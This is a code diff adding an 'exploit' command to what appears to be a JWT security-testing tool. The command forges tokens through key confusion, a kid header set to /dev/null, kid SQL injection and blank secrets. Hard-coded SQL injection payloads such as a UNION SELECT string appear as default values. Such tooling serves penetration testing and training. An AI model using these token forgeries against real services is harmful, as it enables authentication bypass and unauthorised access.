@@ -45,6 +45,14 @@ def main():
     gen_parser.add_argument("--claims", "-c", required=True)
     gen_parser.add_argument("--aspnet", action="store_true", help="Convert claims to ASP.NET XML schemas")
 
+    exploit_parser = subparsers.add_parser("exploit", help="Forge tokens using CVE exploit techniques")
+    exploit_parser.add_argument("token")
+    exploit_parser.add_argument("--attack", "-a", choices=["key-confusion", "devnull", "sqli", "blank"], default="key-confusion", help="Exploit technique")
+    exploit_parser.add_argument("--public-key", "-k", help="Public key PEM file or string for key-confusion")
+    exploit_parser.add_argument("--claims", "-c", default=None, help="JSON claims to inject")
+    exploit_parser.add_argument("--kid", default=None, help="Custom kid header value")
+    exploit_parser.add_argument("--secret", "-s", default=None, help="Secret for SQLi attack")
+
     gui_parser = subparsers.add_parser("gui", help="Launch interactive web dashboard")
     gui_parser.add_argument("--port", "-p", type=int, default=8765, help="Port to serve dashboard on")
     parser.add_argument("--gui", action="store_true", help="Launch interactive web dashboard")
@@ -108,6 +116,32 @@ def main():
         token = generate_token(args.secret, claims, as_aspnet=args.aspnet)
         display_forged(token)
 
+    elif args.command == "exploit":
+        import json
+        from jwtcrack.display import display_forged
+        from jwtcrack.exploits import (
+            forge_key_confusion,
+            forge_kid_devnull,
+            forge_kid_sqli,
+            forge_blank_secret,
+        )
+        claims = json.loads(args.claims) if args.claims else {}
+        if args.attack == "key-confusion":
+            if not args.public_key:
+                print("Error: --public-key is required for key-confusion attack.")
+                sys.exit(1)
+            res = forge_key_confusion(args.token, args.public_key, claims)
+        elif args.attack == "devnull":
+            kid_val = args.kid if args.kid else "/dev/null"
+            res = forge_kid_devnull(args.token, claims, kid=kid_val)
+        elif args.attack == "sqli":
+            inj = args.kid if args.kid else "key' UNION SELECT 'secret123' -- -"
+            sec = args.secret if args.secret else "secret123"
+            res = forge_kid_sqli(args.token, injection=inj, secret=sec, new_claims=claims)
+        elif args.attack == "blank":
+            res = forge_blank_secret(args.token, claims)
+        display_forged(res)
+
 
 def _interactive_mode():
     try:
@@ -124,7 +158,7 @@ def _interactive_mode():
 
         action = Prompt.ask(
             "[bold yellow]What do you want to do?[/bold yellow]",
-            choices=["decode", "analyze", "aspnet", "crack", "forge", "gui"],
+            choices=["decode", "analyze", "aspnet", "exploit", "crack", "forge", "gui"],
             default="gui",
         )
 
@@ -151,6 +185,29 @@ def _interactive_mode():
             decoded = decode_token(token)
             findings = check_aspnet_issues(decoded["payload"])
             display_analysis(decoded, findings)
+
+        elif action == "exploit":
+            attack = Prompt.ask(
+                "[bold yellow]Select exploit technique[/bold yellow]",
+                choices=["key-confusion", "devnull", "sqli", "blank"],
+                default="devnull",
+            )
+            claims_raw = Prompt.ask("[bold yellow]Claims JSON (optional)[/bold yellow]", default="{}")
+            import json
+            from jwtcrack.exploits import forge_key_confusion, forge_kid_devnull, forge_kid_sqli, forge_blank_secret
+            claims = json.loads(claims_raw) if claims_raw else {}
+            if attack == "key-confusion":
+                pub = Prompt.ask("[bold yellow]Path to public key PEM or raw PEM string[/bold yellow]")
+                forged = forge_key_confusion(token, pub, claims)
+            elif attack == "devnull":
+                forged = forge_kid_devnull(token, claims)
+            elif attack == "sqli":
+                inj = Prompt.ask("[bold yellow]KID SQL injection payload[/bold yellow]", default="key' UNION SELECT 'secret' -- -")
+                sec = Prompt.ask("[bold yellow]Injected secret[/bold yellow]", default="secret")
+                forged = forge_kid_sqli(token, injection=inj, secret=sec, new_claims=claims)
+            elif attack == "blank":
+                forged = forge_blank_secret(token, claims)
+            display_forged(forged)
 
         elif action == "crack":
             wordlist = Prompt.ask("[bold yellow]Path to wordlist[/bold yellow]", default="wordlists/common.txt")
